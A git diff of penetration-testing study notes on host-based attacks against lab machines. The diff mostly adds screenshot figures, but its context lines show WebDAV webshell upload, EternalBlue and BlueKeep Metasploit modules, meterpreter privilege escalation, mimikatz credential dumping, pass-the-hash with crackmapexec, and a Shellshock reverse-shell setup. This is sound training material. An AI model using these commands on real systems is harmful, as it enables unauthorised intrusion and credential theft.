@@ -1,4 +1,4 @@
-# 6. System/Host based attacks
+# System/Host based attacks
 
 import Tabs from '@theme/Tabs'; import TabItem from '@theme/TabItem';
 
@@ -124,6 +124,8 @@ john@attack> nmap 10.3.19.124 -A
 john@attack> nmap 10.3.19.124 -p 80 -sV --script http-enum
 ```
 
+<figure><img src="../../.gitbook/assets/43.png" alt=""><figcaption></figcaption></figure>
+
 **Brute-force login**
 
 ```bash
@@ -142,6 +144,8 @@ john@attack> davtest -auth bob:password_123321 -url http://10.3.19.124/webdav/
 john@attack> cadaver http://10.3.19.124/webdav/
         dav> put /usr/share/webshells/asp/webshell.asp
 ```
+
+<figure><img src="../../.gitbook/assets/44.png" alt=""><figcaption></figcaption></figure>
 
 ### Exploiting WebDAV with Metasploit
 
@@ -202,6 +206,8 @@ The SMB protocol utilizes two levels of authentication
 * Share authentication : users must provide a password in order to access restricted share.
 
 _Note: both of these authentication levels utilize a challenge response authentication system._
+
+<figure><img src="../../.gitbook/assets/45.png" alt=""><figcaption></figcaption></figure>
 
 #### What is PSExec ?
 
@@ -291,6 +297,8 @@ The tools is **AutoBlue-MS17-010** from https://github.com/3ndG4me/AutoBlue-MS17
 ```bash
 john@attack> nmap -sV -p 445 --script=smb-vuln-ms17-010 10.10.10.12
 ```
+
+<figure><img src="../../.gitbook/assets/46.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 john@attack> git clone https://github.com/3ndG4me/AutoBlue-MS17-010
@@ -413,6 +421,8 @@ msf6> set rhosts 10.10.10.7
 msf6> exploit
 ```
 
+<figure><img src="../../.gitbook/assets/47.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 msf6> use scanner/rdp/cve_2019_0708_bluekeep_rce
 msf6> set rhosts 10.10.10.7
@@ -500,6 +510,8 @@ _Note : the techniques demonstrated in this video are performed on a Windows 7 S
 msf6> sessions
 ```
 
+<figure><img src="../../.gitbook/assets/48.png" alt=""><figcaption></figcaption></figure>
+
 ```
 msf6> getuid
 msf6> getprivs
@@ -511,12 +523,16 @@ msf6> set session 3
 msf6> run
 ```
 
+<figure><img src="../../.gitbook/assets/49.png" alt=""><figcaption></figcaption></figure>
+
 ```
 msf6> use exploit/windows/local/ms16_014_wmi_recv_notif
 msf6> set session 3
 msf6> set lport 4422
 msf6> exploit
 ```
+
+<figure><img src="../../.gitbook/assets/50.png" alt=""><figcaption></figcaption></figure>
 
 Execute the `systeminfo` command and copy-paste in the file `win7.txt`. Clone the git repository Windows-Exploit-Suggester.
 
@@ -577,6 +593,8 @@ msf6> exploit
 meterpreter> sysinfo
 ```
 
+<figure><img src="../../.gitbook/assets/51.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 meterpreter> pgrep explorer  # 2448
 meterpreter> migrate 2448
@@ -584,9 +602,13 @@ meterpreter> getuid          # VICTIM\admin
 meterpreter> sysinfo
 ```
 
+<figure><img src="../../.gitbook/assets/52.png" alt=""><figcaption></figcaption></figure>
+
 ```
 meterpreter> getprivs
 ```
+
+<figure><img src="../../.gitbook/assets/53.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 # create the listener
@@ -618,9 +640,13 @@ meterpreter> sysinfo
 meterpreter> getprivs
 ```
 
+<figure><img src="../../.gitbook/assets/54.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 meterpreter> ps
 ```
+
+<figure><img src="../../.gitbook/assets/55.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 meterpreter> migrate 688
@@ -732,6 +758,8 @@ c:\windows\system32> start wupdate.exe
 
 _Note : elevated/administrative privileges are required in order to access and interact with the LSASS process._
 
+<figure><img src="../../.gitbook/assets/56.png" alt=""><figcaption></figcaption></figure>
+
 #### LM hash
 
 * LM (LanMan) is the default hashing algorithm that was implemented in Windows operating systems prior to NT4.0.
@@ -740,6 +768,8 @@ _Note : elevated/administrative privileges are required in order to access and i
   * All characters are then converted into uppercase.
   * Each chunk is then hashed separately with the DES algorithm.
 * LM hashing is generally considered to be a weak protocol and can easily be cracked, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes.
+
+<figure><img src="../../.gitbook/assets/57.png" alt=""><figcaption></figcaption></figure>
 
 #### NTLM hash
 
@@ -793,6 +823,8 @@ Execute the `payload.exe` on the target and gain meterpreter on the attacker.
 ```bash
 meterpreter> sysinfo
 ```
+
+<figure><img src="../../.gitbook/assets/58.png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 meterpreter> getuid  # PRIV-ESC\student
@@ -874,6 +906,8 @@ mimikatz> sekurlsa::logonpasswords
 
 #### Demo
 
+<figure><img src="../../.gitbook/assets/59.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 john@attack> msfconsole
 
@@ -954,7 +988,15 @@ john@attack> crackmapexec smb 10.3.21.247 -u Administrator -H "e3c61a68f1b89ee6c
 john@attack> nmap 192.134.66.3
 ```
 
+<figure><img src="../../.gitbook/assets/60.png" alt=""><figcaption></figcaption></figure>
+
 The source code of the web page http://192.134.66.3 grabs information from a CGI script on http://192.134.66.3/gettime.cgi. By catching the request, it's possible to craft the User-Agent to gain a reverse shell. Prepare a netcat listener on the attacker host (port 1234) before sending the request to the victim.
+
+<figure><img src="../../.gitbook/assets/62.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/61.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/63.png" alt=""><figcaption></figcaption></figure>
 
 **MSF method**
 
